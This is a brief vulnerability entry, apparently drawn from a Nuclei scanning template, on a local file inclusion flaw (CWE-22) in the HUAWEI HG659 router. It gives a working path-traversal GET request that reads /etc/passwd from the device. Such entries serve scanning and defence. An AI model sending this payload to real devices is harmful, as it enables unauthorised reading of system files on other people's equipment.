# Vulnerability: HUAWEI HG659 - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`huawei-hg659-lfi.yaml`)

## Description
HUAWEI HG659 is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/lib///....//....//....//....//....//....//....//....//etc//passwd
```

